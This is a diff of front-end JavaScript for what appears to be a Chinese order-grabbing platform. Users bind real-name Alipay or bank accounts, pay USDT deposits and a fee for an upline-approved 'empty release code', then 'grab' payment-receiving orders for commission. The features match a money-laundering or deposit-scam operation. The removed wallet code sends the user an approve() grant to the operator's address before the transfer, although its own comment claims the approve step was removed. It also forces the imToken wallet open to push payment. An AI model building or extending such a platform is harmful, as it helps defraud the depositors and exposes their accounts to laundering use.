-  openModal(`<div class="modal-head"><h2>${isForce ? '请先绑定收款方式' : '绑定收款方式'}</h2>${canClose ? `<button class="icon-btn" data-action="close-modal">✕</button>` : ''}</div><div class="modal-body"><div class="notice" style="margin-bottom:16px">${isForce ? '⚠️ 抢单前至少绑定一种收款方式' : '⚠️ 至少填写一种，可同时绑定支付宝与银行卡'}</div><div style="border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:14px;background:#f8faff"><div style="font-size:13.5px;font-weight:800;color:#2563eb;margin-bottom:12px">💙 支付宝（选填）</div><label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">收款姓名</span><input class="input" id="pm-alipay-name" maxlength="20" placeholder="与支付宝实名一致" value="${esc(alipay.realName)}"></label><label class="field" style="margin-bottom:0"><span class="field-label" style="font-size:12.5px">支付宝账号</span><input class="input" id="pm-alipay-account" maxlength="40" placeholder="手机号或邮箱" value="${esc(alipay.account)}"></label></div><div style="border:1px solid var(--line);border-radius:12px;padding:14px;background:#fffdf8"><div style="font-size:13.5px;font-weight:800;color:#b45309;margin-bottom:12px">🏦 银行卡（选填）</div><label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">收款姓名</span><input class="input" id="pm-bank-name" maxlength="20" placeholder="与银行卡开户名一致" value="${esc(bank.realName)}"></label><label class="field" style="margin-bottom:10px"><span class="field-label" style="font-size:12.5px">银行卡号</span><input class="input" id="pm-bank-account" maxlength="30" placeholder="不空格、不横线" value="${esc(bank.account)}"></label><label class="field" style="margin-bottom:0"><span class="field-label" style="font-size:12.5px">开户银行</span><input class="input" id="pm-bank-bank" maxlength="30" placeholder="例如：中国工商银行" value="${esc(bank.bank)}"></label></div><div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:12px 14px;margin-top:14px"><div style="font-size:12px;color:#16a34a;line-height:1.7">✅ 至少填写支付宝或银行卡其中一项<br><span style="opacity:.85">填的越多，抢单时可选的收款方式越多</span></div></div></div><div class="modal-foot">${canClose ? `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">稍后再说</button>` : ''}<button class="btn btn-primary" data-action="save-paymethod">确认保存</button></div>`);
-}
-
-function openProfile() {
-  const u = state.user; const pms = getPayMethods(u);
-  const pmHtml = pms.length ? pms.map(p => `<div style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1px solid var(--line);border-radius:8px;margin-top:8px"><span class="pm-btn-blue">${p.type === 'alipay' ? '支付宝' : '银行卡'}</span><div style="flex:1;min-width:0"><div style="font-size:13px;font-weight:700">${esc(p.realName || '')}</div><div style="font-size:11.5px;color:var(--ink3);word-break:break-all">${esc(p.account || '')}${p.bank ? ' · ' + esc(p.bank) : ''}</div></div></div>`).join('') : `<div style="margin-top:8px;font-size:13px;color:var(--ink3)">未绑定</div>`;
-  openModal(`<div class="modal-head"><h2>个人资料</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body"><div class="detail-grid" style="margin:0 0 14px"><div class="dg-item"><div class="dg-k">用户名</div><div class="dg-v">${esc(u.username)}</div></div><div class="dg-item"><div class="dg-k">信用分</div><div class="dg-v">${u.credit}</div></div><div class="dg-item"><div class="dg-k">累计收入</div><div class="dg-v">¥${u.income}</div></div><div class="dg-item"><div class="dg-k">押金余额</div><div class="dg-v" style="color:var(--brand)">${u.deposit} USDT</div></div></div><div style="margin-top:12px;padding:12px 14px;background:#fff9ec;border:1px dashed #ffe0b2;border-radius:10px"><div style="font-size:12px;color:#c27800;margin-bottom:4px">🎁 我的邀请码</div><div style="font-size:18px;font-weight:800;color:var(--brand);letter-spacing:2px">${esc(u.inviteCode || '生成中')}</div><div style="font-size:11.5px;color:var(--ink3);margin-top:4px">分享给你的朋友，让他们注册时填写</div></div><div style="margin-top:12px;padding:12px 14px;background:#f8f9fd;border-radius:10px"><div style="font-size:12px;color:var(--ink3);margin-bottom:4px">已绑定的收款方式</div>${pmHtml}</div><button class="btn btn-ghost btn-block" data-action="open-paymethod" style="margin-top:12px;background:#fff;border-color:var(--line)">${pms.length ? '修改收款方式' : '绑定收款方式'}</button><button class="btn btn-block" data-action="logout" style="margin-top:10px;background:#fff4ec;border:1px solid #ffe0b2;color:#c2410c;font-weight:700">🚪 退出登录 / 切换账号</button></div><div class="modal-foot"><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button></div>`);
-}
-
-function openGrabModal(id) {
-  const o = state.orders.find(x => x.id === id);
-  if (!o) return;
-  if (o.status !== 'pending' || myTaker(o)) { toast('这个订单已经不能抢了'); return; }
-  if (!hasPayMethod(state.user)) { window.__pendingGrabId = id; openPayMethodModal(true); return; }
-  if (!hasEnoughDeposit(o)) { toast(`押金不足，需 ${depositRequired(o)} USDT`); return; }
-
-  const pms = getPayMethods(state.user);
-  state.grabChoice = pms.length === 1 ? pms[0].type : (state.grabChoice || pms[0].type);
-  const choiceHtml = pms.length === 1 ? `<div style="padding:12px 14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;margin-bottom:14px"><div style="font-size:12px;color:#16a34a;margin-bottom:4px">将使用以下收款方式</div><div style="font-size:13.5px;font-weight:700;color:#166534">${esc(formatPayMethod(pms[0]))}</div><div style="font-size:12px;color:#16a34a;margin-top:4px">收款姓名：${esc(pms[0].realName)}</div></div>` : `<div style="margin-bottom:14px"><div style="font-size:13px;font-weight:800;color:var(--ink2);margin-bottom:8px">选择收款方式</div><div class="pm-choice">${pms.map(p => `<label class="pm-choice-item${state.grabChoice === p.type ? ' active' : ''}" data-action="pick-pm" data-type="${p.type}"><input type="radio" name="grab-pm" value="${p.type}" ${state.grabChoice === p.type ? 'checked' : ''}><div class="pm-choice-info"><div class="t">${p.type === 'alipay' ? '💙 支付宝' : '🏦 银行卡'}</div><div class="s">${esc(p.account)}${p.bank ? ' · ' + esc(p.bank) : ''} · ${esc(p.realName)}</div></div></label>`).join('')}</div></div>`;
-  openModal(`<div class="modal-head"><h2>确认抢单</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body"><div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:16px;text-align:center;margin-bottom:16px"><div style="font-size:12px;color:var(--ink3);margin-bottom:6px">订单号：${esc(o.orderNo)}</div><div style="font-size:28px;font-weight:850;color:var(--red);letter-spacing:-1px">${Number(o.amount).toFixed(2)}</div><div style="font-size:13px;color:var(--brand);font-weight:700;margin-top:4px">返佣 ${Number(o.commission).toFixed(2)}</div></div><div class="detail-grid" style="margin:0 0 14px"><div class="dg-item"><div class="dg-k">收款类型</div><div class="dg-v">${esc(o.payType)}</div></div><div class="dg-item"><div class="dg-k">本单押金</div><div class="dg-v" style="color:var(--brand)">${depositRequired(o)} USDT</div></div></div>${choiceHtml}<div class="notice">⚡ 抢单后请尽快完成，审核通过后返佣自动结算</div></div><div class="modal-foot"><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">再想想</button><button class="btn btn-primary" data-action="submit-grab" data-id="${o.id}">确认抢单</button></div>`);
-}
-
-async function submitGrab(id) {
-  try { const pms = getPayMethods(state.user); const chosen = pms.find(p => p.type === state.grabChoice) || pms[0]; await api(`/orders/${id}/grab`, { method: 'POST', body: { payMethod: chosen } }); closeModal(); state.mineTab = 'working'; await refreshAll(); toast('抢单成功，请尽快完成'); } catch (e) { toast(e.message); }
-}
-
-async function submitWork(id) {
-  try { await api(`/orders/${id}/work`, { method: 'POST' }); closeModal(); state.mineTab = 'done'; await refreshAll(); toast('订单完成，返佣已到账'); } catch (e) { toast(e.message); }
-}
-
-function openDepositModal(order) {
-  const required = order ? depositRequired(order) : 0; const addr = state.config.trc20 || '';
-  openModal(`<div class="modal-head"><h2>充值押金</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body">${order ? `<div class="notice" style="margin-bottom:14px">🔒 抢此单需押金 ${required} USDT，当前押金 ${state.user.deposit} USDT</div>` : ''}<div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:14px;margin-bottom:16px"><div style="font-size:12.5px;color:var(--ink3)">当前押金余额</div><div style="font-size:22px;font-weight:800;color:var(--brand);margin-top:2px">${state.user.deposit} <span style="font-size:13px">USDT</span></div></div><div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:10px">选择钱包</div><div class="wallet-choices" style="grid-template-columns:1fr"><button class="wallet-card active" data-action="pick-wallet" data-wallet="imtoken"><div class="wc-icon imtoken">${imTokenIconHtml()}</div><div class="wc-info"><div class="wc-name">imToken</div><div class="wc-tip">官方认证 · 推荐使用</div></div><div class="wc-check">✓</div></button></div><div style="background:#f8f9fd; border:1px dashed var(--line); border-radius:12px; padding:16px; margin-bottom:16px; text-align:center;"><div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:12px">扫码转账 (仅限 TRC20)</div><div style="display:inline-block;padding:8px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.05);margin-bottom:12px;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=${esc(addr)}" width="140" height="140" alt="收款二维码" style="display:block;"></div><div style="font-size:12px;color:var(--ink3);margin-bottom:6px;">收款地址</div><div style="display:flex;align-items:center;gap:8px;justify-content:center;max-width:100%;"><span style="font-size:12px;word-break:break-all;color:var(--ink);text-align:left;flex:1;">${esc(addr)}</span><button class="btn btn-ghost" data-action="copy-addr" style="padding:6px 12px;font-size:12px;border-color:var(--line);flex:0 0 auto;">复制</button></div></div><label class="field" style="margin-bottom:12px"><span class="field-label">充值金额（USDT）</span><input class="input" id="deposit-amount" type="number" min="${state.config.minDeposit}" step="1" value="100"></label><button class="btn btn-imtoken btn-block" data-action="pay-imtoken" style="margin-bottom:12px">🦊 一键支付 · 打开 imToken</button><div class="notice">⚠️ 点击"我已完成支付"后，系统将自动查询链上到账记录。</div></div><div class="modal-foot"><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">取消</button><button class="btn btn-primary" data-action="confirm-deposit" data-id="${order ? order.id : ''}">我已完成支付</button></div>`);
-}
-
-async function submitDeposit(orderId) {
-  const amount = Number($('#deposit-amount')?.value) || 0; const min = Number(state.config.minDeposit) || 10;
-  if (amount < min) { toast(`最低充值 ${min} USDT`); return; }
+function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
+function makeTronWebNode(fullHost) {
   try {
-    toast('正在查询链上到账记录…'); const r = await api('/deposit', { method: 'POST', body: { amount } });
-    state.user = r.user; closeModal(); await refreshAll(); toast(`✅ 到账成功！${r.credited} USDT 已入账`);
-    if (orderId) setTimeout(() => openGrabModal(orderId), 400);
-  } catch (e) { toast('❌ ' + e.message); }
+    const tw0 = getTronWeb(); const Ctor = tw0 && tw0.constructor;
+    if (!Ctor) return null;
+    return new Ctor({ fullHost });
+  } catch (e) { return null; }
 }
-
-async function submitDepositDirect(amount) {
-  try { toast('正在查询链上到账记录…'); const r = await api('/deposit', { method: 'POST', body: { amount } }); state.user = r.user; await refreshAll(); toast(`✅ 到账成功！${r.credited} USDT 已入账`); } catch (e) { toast('❌ ' + e.message); }
-}
-
-async function submitRefund() {
-  const amount = Number($('#refund-amount')?.value) || 0; const address = $('#refund-address')?.value.trim();
-  if (amount <= 0) { toast('退款金额不正确'); return; } if (!address) { toast('请输入接收退款的地址'); return; }
-  try { await api('/refund', { method: 'POST', body: { amount, address } }); await refreshAll(); toast('退款申请已提交，等待管理员审核'); } catch (e) { toast(e.message); }
-}
-
-function openEmptyModal() {
-  api('/empty/mine').then(r => {
-    const apply = r.apply;
-    let statusHtml = '';
-    if (!apply || apply.status === 'cancelled') {
-       statusHtml = `<div style="text-align:center; padding:20px 0;"><div style="font-size:14px; color:var(--ink3); margin-bottom:16px;">当前暂无空放码，支付 1 USDT 申请</div><button class="btn btn-imtoken btn-block" data-action="pay-empty-code">🦊 支付 1 USDT 获取资格</button><div style="font-size:12px; color:var(--red); margin-top:10px;">支付后请返回此页面确认</div></div>`;
-    } else if (apply.status === 'pending') {
-       statusHtml = `<div style="text-align:center; padding:30px 0;"><div style="font-size:16px; font-weight:800; color:var(--brand);">审核中</div><div style="font-size:13px; color:var(--ink3); margin-top:8px; margin-bottom:16px;">请尽快联系您的上级/邀请人进行审核</div><button class="btn btn-ghost btn-block" data-action="cancel-empty-code" style="color:#dc2626; border-color:#fecaca;">取消当前申请</button></div>`;
-    } else if (apply.status === 'approved' || apply.status === 'used') {
-       statusHtml = `<div style="text-align:center; padding:20px 0; background:#fff9ec; border-radius:12px; margin-bottom:16px;"><div style="font-size:13px; color:var(--ink3);">您的专属空放码</div><div style="font-size:28px; font-weight:850; color:var(--red); letter-spacing:2px; margin:8px 0;">${apply.code}</div><div style="font-size:12px; color:#16a34a;">请复制此码到上方输入框进行核销</div></div>`;
-    }
-    openModal(`<div class="modal-head"><h2>内部空放通道</h2><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body"><label class="field"><span class="field-label">输入空放码直接接单</span><div style="display:flex; gap:8px;"><input class="input" id="empty-code-input" placeholder="请输入 6 位空放码" style="flex:1; margin-bottom:0;"><button class="btn btn-primary" data-action="redeem-empty-code">核销</button></div></label><div style="height:1px; background:var(--line); margin:24px 0;"></div>${statusHtml}</div>`);
-  }).catch(e => toast(e.message));
-}
-
-function openDetail(id) {
-  const o = state.orders.find(x => x.id === id); if (!o) return;
-  const st = statusOf(o.status); const tk = myTaker(o); const canGrab = o.status === 'pending' && !tk;
-  let takersHtml = '';
-  if (o.takers && o.takers.length) {
-    takersHtml = `<div style="font-size:13px;font-weight:800;color:var(--ink3);letter-spacing:.5px;margin:18px 0 10px">接单者</div>${o.takers.map(x => { const pm = x.payMethod || {}; const isSelf = x.userId === state.user.id; const text = pm.type === 'alipay' ? `支付宝：${pm.account}` : pm.type === 'bank' ? `银行卡：${pm.bank || ''} ${pm.account}` : '未提供'; return `<div style="padding:12px;border:1px solid var(--line);border-radius:10px;margin-bottom:8px"><div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><div class="avatar">${esc((x.userName || '?').slice(0, 1))}</div><div style="flex:1;min-width:0"><div style="font-size:13.5px;font-weight:700">${esc(x.userName)} ${isSelf ? '（我）' : ''}</div><div style="font-size:11.5px;color:var(--ink3);margin-top:3px">${timeAgo(x.at)} 接单</div></div><div style="font-size:13px;font-weight:800;color:var(--brand)">¥${Number(o.commission).toFixed(2)}</div></div>${isSelf ? `<div style="font-size:12px;color:var(--ink2);padding:8px 10px;background:#f8f9fd;border-radius:8px"><div>${esc(text)}</div><div style="color:var(--ink3);margin-top:2px">收款姓名：${esc(pm.realName || '')}</div></div>` : `<div style="font-size:12px;color:var(--ink3);padding:8px 10px;background:#f8f9fd;border-radius:8px">仅本人可见</div>`}</div>`; }).join('')}`;
+async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
+  const builders = [tw.transactionBuilder];
+  for (const host of BACKUP_NODES) {
+    const inst = makeTronWebNode(host);
+    if (inst) builders.push(inst.transactionBuilder);
   }
-  let foot = ''; if (canGrab) foot = `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button><button class="btn btn-primary" data-action="grab" data-id="${o.id}">立即抢单</button>`; else if (tk && tk.status === 'working') foot = `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button><button class="btn btn-primary" data-action="submit-work" data-id="${o.id}">提交完成</button>`; else foot = `<div style="flex:1"></div><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button>`;
-  openModal(`<div class="modal-head"><span class="order-status ${st.cls}" style="font-size:13px">${st.text}</span><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body"><div style="font-size:12.5px;color:var(--ink3);margin-bottom:6px">订单号：${esc(o.orderNo)}</div><div class="detail-price">${Number(o.amount).toFixed(2)}</div><div style="font-size:14px;font-weight:800;color:var(--brand)">返佣 ${Number(o.commission).toFixed(2)}</div><div class="detail-grid"><div class="dg-item"><div class="dg-k">创建时间</div><div class="dg-v">${fmtDateTime(o.createdAt)}</div></div><div class="dg-item"><div class="dg-k">收款类型</div><div class="dg-v">${esc(o.payType)}</div></div><div class="dg-item"><div class="dg-k">发布者</div><div class="dg-v">${esc(o.publisherName)}</div></div><div class="dg-item"><div class="dg-k">本单押金</div><div class="dg-v" style="color:var(--brand)">${depositRequired(o)} USDT</div></div></div>${o.desc ? `<div class="detail-desc">${esc(o.desc)}</div>` : ''}${takersHtml}</div><div class="modal-foot">${foot}</div>`);
+  const tasks = builders.map(b => withTimeout(
+    b.triggerSmartContract(contract, fnSig, { feeLimit: TX_FEE_LIMIT }, params, fromAddress),
+    TX_BUILD_TIMEOUT, '节点超时'
+  ));
+  return withRetry(() => promiseAny(tasks), 2, 500);
 }
 
-// === 钱包内直接支付（单步 transfer；已移除冗余 approve 授权步骤，避免二次弹窗与能量不足导致失败） ===
-async function executePayInline(to, amount, isEmptyCode) {
-  closeModal();
-  toast('正在唤起钱包支付…');
-  setTimeout(async () => {
-    try {
-      const tw = getTronWeb();
-      if (!tw) throw new Error('未检测到钱包环境，请在 imToken 钱包内打开本页面');
-      // 等待钱包就绪 + 地址注入（安卓 imToken 上 ready 先于地址注入，必须同时等待地址非空）
-      // imToken 部分版本 ready 恒为 false，不强制等 ready；只要地址可用即继续（最多 5 秒）
-      let waited = 0;
-      while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
-        await new Promise(r => setTimeout(r, 200)); waited += 200;
-      }
-      let fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
-      if (!fromAddress && tw.defaultAddress && tw.defaultAddress.hex) {
-        try { fromAddress = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
-      }
-      if (!fromAddress) throw new Error('钱包地址未就绪，请退出页面后重新进入');
-
-      const withTimeout = (p, ms, msg) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]);
-      const withRetry = async (fn, times, delay) => { let lastErr; for (let i=0;i<times;i++){ try { return await fn(); } catch(e){ lastErr=e; if (i<times-1) await new Promise(r=>setTimeout(r,delay)); } } throw lastErr; };
-      // 多节点并行构建：取最快成功的节点，解决 imToken 默认节点慢导致 approve 弹窗卡顿
-      function promiseAny(promises) {
-        return new Promise(function (resolve, reject) {
-          var errs = [], done = 0;
-          promises.forEach(function (p, i) {
-            Promise.resolve(p).then(resolve, function (e) { errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('所有节点均失败')); });
-          });
-        });
-      }
-      function makeTronWebNode(fullHost) {
-        try {
-          var tw0 = window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink;
-          var Ctor = tw0 && tw0.constructor;
-          if (!Ctor) return null;
-          return new Ctor({ fullHost: fullHost });
-        } catch (e) { return null; }
-      }
-      var BACKUP_NODES = ['https://api.trongrid.io', 'https://api.tronstack.io'];
-      async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
-        var builders = [tw.transactionBuilder];
-        for (var i = 0; i < BACKUP_NODES.length; i++) {
-          var inst = makeTronWebNode(BACKUP_NODES[i]);
-          if (inst) builders.push(inst.transactionBuilder);
-        }
-        var tasks = builders.map(function (b) {
-          return withTimeout(
-            b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress),
-            6000, '节点超时'
-          );
-        });
-        return withRetry(function () { return promiseAny(tasks); }, 2, 500);
-      }
-
-      // —— 第 1 步：授权 approve（1 USDT，与原流程一致）——
-      const approveParam = [
-        { type: 'address', value: to },
-        { type: 'uint256', value: '1000000' }
-      ];
-      toast('正在构建授权交易，请稍候…');
-      const slowTipA = setTimeout(() => toast('⏳ 节点响应较慢，正在多节点加速…'), 3000);
-      const txApprove = await buildTxMulti(tw, USDT_TRC20, 'approve(address,uint256)', approveParam, fromAddress);
-      clearTimeout(slowTipA);
-      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败，请重试');
-      toast('✅ 请在钱包弹窗中确认授权（1U）…');
-      const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), 120000, '授权签名超时（您可能未在钱包中确认），请重试');
-      await withTimeout(tw.trx.sendRawTransaction(signedApprove), 15000, '广播授权交易超时，请检查网络后重试');
-      toast('✅ 授权成功，准备支付…');
-      await new Promise(r => setTimeout(r, 2500));
-
-      // —— 第 2 步：转账支付 ——
-      const amountUnits = Math.floor(amount * 1e6).toString();
-      const transferParam = [
-        { type: 'address', value: to },
-        { type: 'uint256', value: amountUnits }
-      ];
-
-      toast('正在构建支付交易，请稍候…');
-      const slowTipT = setTimeout(() => toast('⏳ 节点响应较慢，正在多节点加速…'), 3000);
-      const txTransfer = await buildTxMulti(tw, USDT_TRC20, 'transfer(address,uint256)', transferParam, fromAddress);
-      clearTimeout(slowTipT);
-      if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败，请重试');
-
-      toast('✅ 请在钱包弹窗中确认支付…');
-      const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), 120000, '支付签名超时（您可能未在钱包中确认），请重试');
-      await withTimeout(tw.trx.sendRawTransaction(signed), 15000, '广播交易超时，请检查网络后重试');
-
-      toast('✅ 支付完成，请在钱包账单中查看');
-      await refreshAll();
-      if (isEmptyCode) {
-        api('/empty/apply', { method: 'POST' }).then(() => { toast('申请已提交，请联系邀请人审核'); openEmptyModal(); }).catch(e => toast(e.message));
-      }
-    } catch (e) {
-      console.error(e);
-      let errMsg = e.message || '请检查网络';
-      if (/declined|cancel|rejected|用户取消/i.test(errMsg)) errMsg = '您已取消支付';
-      toast('❌ ' + errMsg);
-    }
-  }, 500);
-}
-
-
-// ===== 钱包唤起与环境检测（修复 imToken 打不开 / 内置浏览器拦截 / approve 失败） =====
-const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-function getTronWeb() {
-  return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null;
-}
+/* ================= 环境检测 / 唤起 ================= */
 function isWalletEnv() {
   const ua = (navigator.userAgent || '').toLowerCase();
   const tw = getTronWeb();
@@ -629,22 +325,27 @@ function isInAppBrowser() {
   const ua = (navigator.userAgent || '').toLowerCase();
   return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay|; ?wv\)|webview/i.test(ua);
 }
-// imToken 官方 Universal Link（HTTPS 不被内置浏览器拦截；未装钱包则跳下载页）
 function imTokenUniversalLink(dappUrl) {
   return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(dappUrl);
+}
+function androidIntentLink(dappUrl) {
+  const ul = imTokenUniversalLink(dappUrl);
+  return 'intent://navigate/DappView?url=' + encodeURIComponent(dappUrl)
+    + '#Intent;scheme=imtokenv2;package=im.token.app;'
+    + 'S.browser_fallback_url=' + encodeURIComponent(ul) + ';end';
 }
 function fallbackCopy(text, done) {
   try {
     const ta = document.createElement('textarea'); ta.value = text;
-    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    ta.style.cssText = 'position:fixed;opacity:0';
     document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
     if (done) done();
   } catch (e) { prompt('请复制以下支付链接，到 imToken 浏览中打开：', text); }
 }
 function copyText(text, done) {
-  if (navigator.clipboard && navigator.clipboard.writeText) {
+  if (navigator.clipboard && navigator.clipboard.writeText)
     navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done));
-  } else fallbackCopy(text, done);
+  else fallbackCopy(text, done);
 }
 function showInAppGuide(payPageUrl) {
   if (document.getElementById('__inapp_guide__')) return;
@@ -666,66 +367,907 @@ function showInAppGuide(payPageUrl) {
     copyText(payPageUrl, () => { this.textContent = '✅ 已复制，请在浏览器粘贴打开'; this.style.background = '#16a34a'; });
   };
 }
-// 唤起 imToken：优先 Universal Link；2.5 秒未离开页面则给出手动兜底
-// 安卓 intent:// 协议：直接指定 imToken 包名秒开 DApp 浏览器，未安装则兜底 Universal Link
-function androidIntentLink(dappUrl) {
-  const ul = imTokenUniversalLink(dappUrl);
-  return 'intent://navigate/DappView?url=' + encodeURIComponent(dappUrl)
-    + '#Intent;scheme=imtokenv2;package=im.token.app;'
-    + 'S.browser_fallback_url=' + encodeURIComponent(ul) + ';end';
-}
-function openInImToken(payPageUrl) {
-  // 自动复制支付链接：imToken 冷启动可能丢参数，用户可直接粘贴兜底
-  copyText(payPageUrl);
-  toast('支付链接已复制，若 imToken 未自动打开支付页，请在 imToken「浏览」粘贴');
-  if (isInAppBrowser()) { showInAppGuide(payPageUrl); return; }
-  const ul = imTokenUniversalLink(payPageUrl);
+
+/* 冷启动安全唤起（P1-1 / P1-4）：hash 双写 + localStorage 兜底 */
+function openInImToken(payPageUrl, ctx) {
+  if (ctx && ctx.a && ctx.n > 0) savePayCtxToLS(ctx.a, ctx.n, ctx.t);
+  const safeUrl = ctx && ctx.a && ctx.n > 0 ? buildPayUrl(ctx.a, ctx.n, ctx.t) : payPageUrl;
+  copyText(safeUrl);
+  toast('支付链接已复制（含冷启动兜底参数）');
+  if (isInAppBrowser()) { showInAppGuide(safeUrl); return; }
+  const ul = imTokenUniversalLink(safeUrl);
   if (/android/i.test(navigator.userAgent || '')) {
-    location.href = androidIntentLink(payPageUrl);
-    // 冷启动时 intent 可能丢失参数，800ms 后静默重试 Universal Link（不弹窗，不影响已唤起的情况）
-    setTimeout(() => { if (document.visibilityState !== 'hidden') location.href = ul; }, 800);
+    location.href = androidIntentLink(safeUrl);
+    setTimeout(() => { if (document.visibilityState !== 'hidden') location.href = ul; }, DELAY_UL_RETRY);
   } else {
     location.href = ul;
   }
 }
 
-function payWithImToken() {
-  const to = state.config.trc20; const amount = Number($('#deposit-amount')?.value) || 0;
-  if (!to) { toast('收款地址未配置'); return; } if (amount < 1) { toast('请输入支付金额'); return; }
-  if (isWalletEnv()) { executePayInline(to, amount, false); return; }
-  const payPageUrl = `${location.origin}/pay?a=${encodeURIComponent(to)}&n=${amount}&t=deposit`;
-  openInImToken(payPageUrl);
+/* ================= State（临时状态收敛到 temp） ================= */
+const state = {
+  user: null, orders: [], refunds: [],
+  config: {
+    trc20: '', emptyTrc20: '', ratio: 0.1, minDeposit: 10, notice: '', support: '',
+    tabCancelName: '集团介绍', videoUrl: '', aboutTitle: '企业简介', aboutText: '',
+    featureList: [], linkCardTitle: '', linkList: [], walletIconUrl: '', loginLogoUrl: ''
+  },
+  view: 'hall', orderTab: 'cancelled', mineTab: 'working', authTab: 'login',
+  loading: false, pollTimer: null, grabChoice: null, wallet: 'imtoken', featureOpen: {},
+  temp: { pendingGrabId: null, pmForce: false }
+};
+
+/* ================= 业务工具 ================= */
+function getPayMethods(u) {
+  if (!u || !u.payMethod) return [];
+  const pm = u.payMethod;
+  if (pm.type) return [pm];
+  const arr = [];
+  if (pm.alipay) arr.push({ type: 'alipay', ...pm.alipay });
+  if (pm.bank) arr.push({ type: 'bank', ...pm.bank });
+  return arr;
+}
+function hasPayMethod(u) { return getPayMethods(u).length > 0; }
+function formatPayMethod(pm) {
+  if (!pm) return '';
+  if (pm.type === 'alipay') return `支付宝 · ${pm.account || ''}`;
+  if (pm.type === 'bank') return `银行卡 · ${pm.bank || ''} ${pm.account || ''}`;
+  return '';
+}
+function depositRequired(o) {
+  const r = Number(state.config.ratio) || 0.1;
+  const min = Number(state.config.minDeposit) || 10;
+  return Math.max(min, Math.round(Number(o.amount) * r));
+}
+function hasEnoughDeposit(o) { return Number(state.user?.deposit || 0) >= depositRequired(o); }
+const myTaker = o => (o.takers || []).find(x => x.userId === state.user?.id) || null;
+
+/* ================= 刷新 / 轮询 ================= */
+async function refreshAll(silent = false) {
+  if (!getToken() || !state.user) return true;
+  try {
+    const [meRes, ordersRes, refundsRes] = await Promise.all([api('/me'), api('/orders'), api('/refunds/mine')]);
+    const buildKey = () => JSON.stringify({
+      u: state.user ? [state.user.deposit, state.user.income] : null,
+      o: state.orders.map(o => o.id + '|' + o.status + '|' + (o.takers || []).length),
+      r: state.refunds.map(r => r.id + '|' + r.status)
+    });
+    const oldKey = buildKey();
+    state.user = meRes.user; state.orders = ordersRes.orders || []; state.refunds = refundsRes.refunds || [];
+    if (!silent) { render(); return true; }
+    if (oldKey === buildKey()) return true;
+    const activeEl = document.activeElement;
+    const isTyping = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA');
+    const modalOpen = !!document.querySelector('.overlay');
+    if (isTyping || modalOpen) return true;
+    render();
+    return true;
+  } catch (e) {
+    reportError('refreshAll', e);
+    if (!silent) toast(e.message);
+    return false;
+  }
+}
+function startPolling() {
+  stopPolling();
+  let delay = POLL_BASE;
+  const tick = async () => {
+    if (document.visibilityState === 'visible' && state.user) {
+      const ok = await refreshAll(true);
+      delay = ok === false ? Math.min(Math.round(delay * 1.6), POLL_MAX) : POLL_BASE;
+    }
+    state.pollTimer = setTimeout(tick, delay);
+  };
+  state.pollTimer = setTimeout(tick, POLL_BASE);
+}
+function stopPolling() { if (state.pollTimer) { clearTimeout(state.pollTimer); state.pollTimer = null; } }
+
+async function loadConfig() {
+  try { const r = await api('/config'); state.config = Object.assign(state.config, r.config || {}); }
+  catch (e) { reportError('loadConfig', e); }
 }
 
+async function bootstrap() {
+  const token = getToken();
+  if (!token) {
+    render();
+    api('/config')
+      .then(r => { state.config = Object.assign(state.config, r.config || {}); render(); })
+      .catch(() => {});
+    return;
+  }
+  if (!state.user) state.user = { username: '加载中', deposit: '...', credit: '...', income: '...', payMethod: null };
+  render();
+  try {
+    const [configRes, meRes, ordersRes, refundsRes] = await Promise.all([
+      api('/config'), api('/me'), api('/orders'), api('/refunds/mine')
+    ]);
